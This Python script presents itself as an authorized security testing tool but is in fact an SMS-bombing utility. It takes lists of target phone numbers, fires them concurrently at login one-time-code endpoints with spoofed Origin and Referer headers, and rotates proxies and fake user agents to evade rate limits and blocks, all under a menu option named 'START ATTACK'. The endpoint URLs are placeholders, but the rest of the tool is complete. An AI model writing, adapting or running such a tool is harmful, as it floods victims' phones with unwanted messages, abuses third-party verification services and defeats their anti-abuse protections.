#!/usr/bin/env python3
"""
Panda SMS Sender v4.0
Authorized Security Testing Tool
"""

import os
import sys
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    os.system(f"{sys.executable} -m pip install requests -q")
    import requests

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    os.system(f"{sys.executable} -m pip install colorama -q")
    from colorama import init, Fore, Style
    init(autoreset=True)

try:
    from fake_useragent import UserAgent
    ua = UserAgent()
except:
    os.system(f"{sys.executable} -m pip install fake_useragent -q")
    from fake_useragent import UserAgent
    ua = UserAgent()

# ============== CONFIG ==============
NUMBERS_FILE = "targets.txt"
PROXY_FILE = "proxies.txt"
UA_FILE = "user_agents.txt"
THREAD_COUNT = 5
TOOL_VERSION = "4.0"
# ====================================

# Global variables
numbers_list = []
proxies_list = []
user_agents_list = []
running = False
stats = {"ok": 0, "fail": 0, "total": 0}
stats_lock = threading.Lock()

# API endpoints (generic naming)
API_ENDPOINTS = {
    'BD': {'url': 'https://api.example.com/v2/user/send-code', 'origin': 'https://www.example.com'},
    'IN': {'url': 'https://api.example.com/v2/user/send-code', 'origin': 'https://www.example.in'},
    'US': {'url': 'https://api.example.com/v2/user/send-code', 'origin': 'https://www.example.com'},
    'GB': {'url': 'https://api.example.com/v2/user/send-code', 'origin': 'https://www.example.co.uk'},
    'FR': {'url': 'https://api.example.com/v2/user/send-code', 'origin': 'https://fr.example.com'},
    'DE': {'url': 'https://api.example.com/v2/user/send-code', 'origin': 'https://de.example.com'},
}


# =================== HELPER FUNCTIONS ===================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def get_country_from_ip(proxy_str=None):
    """Detect country code from IP/proxy"""
    try:
        if proxy_str:
            parts = proxy_str.split(':')
            ip = parts[0]
            if not ip.replace('.', '').isdigit():
                return 'Unknown'
        else:
            r = requests.get('https://httpbin.org/ip', timeout=5)
            ip = r.json().get('origin', '').split(',')[0].strip()
            if not ip:
                return 'Unknown'

        r = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        if r.status_code == 200:
            data = r.json()
            if data.get('status') == 'success':
                return data.get('countryCode', 'Unknown')
    except:
        pass
    return 'Unknown'


def detect_current_ip_country():
    if proxies_list:
        return get_country_from_ip(proxies_list[0])
    return get_country_from_ip(None)


def format_number(num):
    """Ensure number has + prefix"""
    num = num.strip()
    if num and not num.startswith('+'):
        num = '+' + num
    return num


# =================== PARSE FUNCTIONS ===================

def parse_phone(number):
    """Parse phone number and return info"""
    number = format_number(number)
    try:
        import phonenumbers
        from phonenumbers import geocoder
        obj = phonenumbers.parse(number, None)
        return {
            'code': str(obj.country_code),
            'region': phonenumbers.region_code_for_number(obj) or 'US',
            'country': geocoder.description_for_number(obj, "en") or 'Unknown',
            'valid': phonenumbers.is_valid_number(obj),
        }
    except:
        if number.startswith('+'):
            cc_map = {
                '880': 'BD', '91': 'IN', '1': 'US', '44': 'GB', '62': 'ID',
                '60': 'MY', '65': 'SG', '81': 'JP', '82': 'KR', '86': 'CN',
                '49': 'DE', '33': 'FR', '61': 'AU', '55': 'BR', '971': 'AE',
                '966': 'SA', '92': 'PK', '234': 'NG', '27': 'ZA', '20': 'EG',
                '90': 'TR', '7': 'RU', '351': 'PT', '31': 'NL'
            }
            for cc_len in [3, 2, 1]:
                cc = number[1:1+cc_len]
                if cc in cc_map:
                    return {'code': cc, 'region': cc_map[cc], 'country': cc_map[cc], 'valid': True}
        return {'code': '', 'region': 'US', 'country': 'Unknown', 'valid': False}


# =================== SENDER ===================

def send_sms(phone, country_code, user_agent_str, proxy=None, region='US'):
    """Send SMS via API"""
    ep = API_ENDPOINTS.get(region, API_ENDPOINTS['US'])
    
    headers = {
        'User-Agent': user_agent_str,
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': ep['origin'],
        'Referer': f"{ep['origin']}/",
        'X-Requested-With': 'XMLHttpRequest',
    }
    
    payload = {
        'phone': phone,
        'countryCode': country_code,
        'type': 'login',
        'areaCode': country_code,
        'source': 'web',
    }
    
    proxies = None
    if proxy:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) >= 4:
            proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
        elif len(proxy_parts) == 2:
            proxy_url = f"http://{proxy_parts[0]}:{proxy_parts[1]}"
        else:
            proxy_url = f"http://{proxy}"
        proxies = {'http': proxy_url, 'https': proxy_url}
    
    try:
        r = requests.post(ep['url'], headers=headers, json=payload, proxies=proxies, timeout=20)
        
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get('code') == 0 or data.get('success') == True:
                    return True, "✓ Sent"
                if data.get('code') == 10005:
                    return False, "⚠ Duplicate"
                if data.get('code') == 10006:
                    return False, "⏳ Too Fast"
                return True, "✓ Sent"
            except:
                return True, "✓ Sent"
        elif r.status_code == 429:
            return False, "⏳ Rate Limit"
        elif r.status_code == 403:
            return False, "🔒 Blocked"
        else:
            return False, f"✗ HTTP {r.status_code}"
    
    except requests.exceptions.ProxyError:
        return False, "✗ Proxy Error"
    except requests.exceptions.Timeout:
        return False, "✗ Timeout"
    except Exception as e:
        return False, f"✗ {str(e)[:30]}"


# =================== WORKER ===================

def worker(number, idx, total):
    global running, stats
    
    if not running:
        return
    
    num_clean = format_number(number)
    info = parse_phone(num_clean)
    
    if not info.get('valid'):
        with stats_lock:
            stats['fail'] += 1
            stats['total'] += 1
            print(f"  {Fore.RED}[✗] [{idx+1}/{total}] {num_clean} → Invalid Number")
        return
    
    region = info.get('region', 'US')
    code = info.get('code', '1')
    
    proxy = random.choice(proxies_list) if proxies_list else None
    ua_str = random.choice(user_agents_list) if user_agents_list else ua.random
    
    ok, msg = send_sms(num_clean, code, ua_str, proxy, region)
    
    with stats_lock:
        stats['total'] += 1
        if ok:
            stats['ok'] += 1
            print(f"  {Fore.GREEN}[✓] [{idx+1}/{total}] {num_clean} → {msg}")
        else:
            stats['fail'] += 1
            print(f"  {Fore.RED}[✗] [{idx+1}/{total}] {num_clean} → {msg}")
    
    time.sleep(random.uniform(0.3, 1.0))


# =================== HEADER DISPLAY ===================

def show_header():
    ip_country = detect_current_ip_country()
    num_count = len(numbers_list)
    
    header = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════════════════╗
║              🐼 PANDA SMS SENDER v{TOOL_VERSION}               ║
║                    MULTI-REGION TOOL                   ║
╠══════════════════════════════════════════════════════════════╣
║  {Fore.WHITE}IP:{Style.RESET_ALL} {Fore.GREEN}{ip_country:<18}{Style.RESET_ALL} {Fore.WHITE}Targets:{Style.RESET_ALL} {Fore.YELLOW}{num_count:<5}{Style.RESET_ALL}           ║
║  {Fore.WHITE}Proxies:{Style.RESET_ALL} {Fore.CYAN}{len(proxies_list):<5}{Style.RESET_ALL}  {Fore.WHITE}UAs:{Style.RESET_ALL} {Fore.CYAN}{len(user_agents_list) or 'Auto':<5}{Style.RESET_ALL}              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
    print(header)


# =================== MAIN MENU ===================

def show_main_menu():
    clear_screen()
    show_header()
    
    print(f"{Fore.CYAN}╔══════ PANDA MAIN MENU ═══════════════════════════════╗{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Set Proxy")
    print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Add Target")
    print(f"  {Fore.WHITE}[3]{Style.RESET_ALL} Add User Agent")
    print(f"  {Fore.GREEN}[4]{Style.RESET_ALL} ▶▶ START ◀◀")
    print(f"  {Fore.RED}[0]{Style.RESET_ALL} Exit")
    print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")


# =================== PROXY MENU ===================

def proxy_menu():
    while True:
        clear_screen()
        show_header()
        print(f"{Fore.CYAN}╔══════ PROXY MENU ═══════════════════════════════════╗{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Add Proxy")
        print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Clear All")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} Back")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Proxies: {len(proxies_list)}{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}┌─[{Fore.GREEN}root{Fore.YELLOW}@{Fore.CYAN}PandaSMS{Fore.YELLOW}]─[{Fore.CYAN}Proxy{Fore.YELLOW}]\n└──╼ {Style.RESET_ALL}").strip()
        
        if choice == '1':
            print(f"\n{Fore.CYAN}Paste proxy (IP:Port:User:Pass or IP:Port):{Style.RESET_ALL}")
            p = input(f"{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
            if p:
                proxies_list.append(p)
                print(f"\n{Fore.GREEN}  ✓ Set Successfully!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif choice == '2':
            if proxies_list:
                print(f"\n{Fore.YELLOW}  Are You Sure? (y/n):{Style.RESET_ALL} ", end='')
                c = input().strip().lower()
                if c == 'y':
                    proxies_list.clear()
                    print(f"{Fore.GREEN}  ✓ Remove Successfully!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}  [!] No proxies.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif choice == '0':
            break
        else:
            print(f"{Fore.RED}  [!] Invalid!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


# =================== TARGET MENU ===================

def target_menu():
    global numbers_list
    
    while True:
        clear_screen()
        show_header()
        print(f"{Fore.CYAN}╔══════ TARGET MENU ══════════════════════════════════╗{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Add")
        print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Clear All")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} Back")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  Targets: {len(numbers_list)}{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}┌─[{Fore.GREEN}root{Fore.YELLOW}@{Fore.CYAN}PandaSMS{Fore.YELLOW}]─[{Fore.CYAN}Targets{Fore.YELLOW}]\n└──╼ {Style.RESET_ALL}").strip()
        
        if choice == '1':
            print(f"\n{Fore.CYAN}Paste target numbers (one per line, type 'done' to finish):{Style.RESET_ALL}")
            added = 0
            while True:
                n = input(f"{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
                if n.lower() == 'done':
                    break
                if n:
                    numbers_list.append(format_number(n))
                    added += 1
            if added > 0:
                print(f"\n{Fore.GREEN}  ✓ Add {added} target(s) successfully!{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}  [!] No targets added.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Back to Main Menu...{Style.RESET_ALL}")
            break
        
        elif choice == '2':
            if numbers_list:
                print(f"\n{Fore.YELLOW}  Are You Sure? (y/n):{Style.RESET_ALL} ", end='')
                c = input().strip().lower()
                if c == 'y':
                    numbers_list.clear()
                    print(f"{Fore.GREEN}  ✓ Remove Successfully!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
                elif c == 'n':
                    print(f"\n{Fore.YELLOW}  Remove Cancelled!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Back to Main Menu...{Style.RESET_ALL}")
                    break
            else:
                print(f"\n{Fore.YELLOW}  [!] No targets.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif choice == '0':
            break
        else:
            print(f"{Fore.RED}  [!] Invalid!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


# =================== USER AGENT MENU ===================

def ua_menu():
    global user_agents_list
    
    while True:
        clear_screen()
        show_header()
        print(f"{Fore.CYAN}╔══════ USER AGENT MENU ═══════════════════════════════╗{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}[1]{Style.RESET_ALL} Add UA")
        print(f"  {Fore.WHITE}[2]{Style.RESET_ALL} Clear All")
        print(f"  {Fore.RED}[0]{Style.RESET_ALL} Back")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════╝{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}  UAs: {len(user_agents_list) or 'Auto'}{Style.RESET_ALL}")
        
        choice = input(f"\n{Fore.YELLOW}┌─[{Fore.GREEN}root{Fore.YELLOW}@{Fore.CYAN}PandaSMS{Fore.YELLOW}]─[{Fore.CYAN}UA{Fore.YELLOW}]\n└──╼ {Style.RESET_ALL}").strip()
        
        if choice == '1':
            print(f"\n{Fore.CYAN}Paste User Agents (one per line, type 'done' to finish):{Style.RESET_ALL}")
            added = 0
            while True:
                u = input(f"{Fore.YELLOW}└──╼ {Style.RESET_ALL}").strip()
                if u.lower() == 'done':
                    break
                if u:
                    user_agents_list.append(u)
                    added += 1
            if added > 0:
                print(f"\n{Fore.GREEN}  ✓ Add {added} UA(s) successfully!{Style.RESET_ALL}")
            else:
                print(f"\n{Fore.YELLOW}  [!] No UAs added.{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Back to Main Menu...{Style.RESET_ALL}")
            break
        
        elif choice == '2':
            if user_agents_list:
                print(f"\n{Fore.YELLOW}  Are You Sure? (y/n):{Style.RESET_ALL} ", end='')
                c = input().strip().lower()
                if c == 'y':
                    user_agents_list.clear()
                    print(f"{Fore.GREEN}  ✓ Remove Successfully!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
                elif c == 'n':
                    print(f"\n{Fore.YELLOW}  Remove Cancelled!{Style.RESET_ALL}")
                    input(f"\n{Fore.CYAN}[Enter] Back to Main Menu...{Style.RESET_ALL}")
                    break
            else:
                print(f"\n{Fore.YELLOW}  [!] No UAs.{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        
        elif choice == '0':
            break
        else:
            print(f"{Fore.RED}  [!] Invalid!{Style.RESET_ALL}")
            input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


# =================== START ATTACK ===================

def start_attack():
    global running, stats
    
    if not numbers_list:
        print(f"\n{Fore.RED}  [!] No targets loaded!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        return
    
    clear_screen()
    show_header()
    
    print(f"{Fore.CYAN}{'═'*56}")
    print(f"  {Fore.WHITE}ATTACK PLAN{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Targets:{Style.RESET_ALL} {len(numbers_list)}")
    print(f"  {Fore.WHITE}Proxies:{Style.RESET_ALL} {len(proxies_list)}")
    print(f"  {Fore.WHITE}Threads:{Style.RESET_ALL} {THREAD_COUNT}")
    print(f"{Fore.CYAN}{'═'*56}")
    
    for i, num in enumerate(numbers_list[:5], 1):
        info = parse_phone(num)
        r = info.get('region', '?')
        print(f"  {i}. {num} → {r}")
    if len(numbers_list) > 5:
        print(f"  ... +{len(numbers_list)-5} more")
    
    print(f"\n{Fore.YELLOW}[?] Start? (y/N): {Style.RESET_ALL}", end='')
    c = input().strip().lower()
    
    if c != 'y':
        print(f"{Fore.YELLOW}[!] Cancelled{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
        return
    
    running = True
    stats = {"ok": 0, "fail": 0, "total": 0}
    
    print(f"\n{Fore.CYAN}{'═'*56}")
    print(f"  {Fore.GREEN}STARTED{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'═'*56}\n")
    
    t0 = time.time()
    
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as ex:
        fs = {ex.submit(worker, n, i, len(numbers_list)): i for i, n in enumerate(numbers_list)}
        for f in as_completed(fs):
            if not running:
                break
            f.result()
    
    t = time.time() - t0
    
    print(f"\n{'═'*56}")
    print(f"  {Fore.WHITE}Completed in {t:.2f}s{Style.RESET_ALL}")
    print(f"  {Fore.GREEN}✓ Success: {stats['ok']}{Style.RESET_ALL}")
    print(f"  {Fore.RED}✗ Failed:  {stats['fail']}{Style.RESET_ALL}")
    print(f"  {Fore.WHITE}Total:    {stats['total']}{Style.RESET_ALL}")
    print(f"{'═'*56}")
    
    running = False
    input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")


# =================== MAIN LOOP ===================

def main():
    global numbers_list, proxies_list, user_agents_list, running
    
    for fname in [NUMBERS_FILE, PROXY_FILE, UA_FILE]:
        if not os.path.exists(fname):
            with open(fname, 'w') as f:
                f.write(f"# {fname}\n")
    
    try:
        while True:
            show_main_menu()
            choice = input(f"\n{Fore.YELLOW}┌─[{Fore.GREEN}root{Fore.YELLOW}@{Fore.CYAN}PandaSMS{Fore.YELLOW}]─[{Fore.CYAN}Menu{Fore.YELLOW}]\n└──╼ {Style.RESET_ALL}").strip()
            
            if choice == '1':
                proxy_menu()
            elif choice == '2':
                target_menu()
            elif choice == '3':
                ua_menu()
            elif choice == '4':
                start_attack()
            elif choice == '0':
                print(f"\n{Fore.YELLOW}[!] Exiting...{Style.RESET_ALL}")
                sys.exit(0)
            else:
                print(f"{Fore.RED}[!] Invalid!{Style.RESET_ALL}")
                input(f"\n{Fore.CYAN}[Enter] Continue...{Style.RESET_ALL}")
    
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}[!] Interrupted.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
        sys.exit(1)


if __name__ == "__main__":
    main()
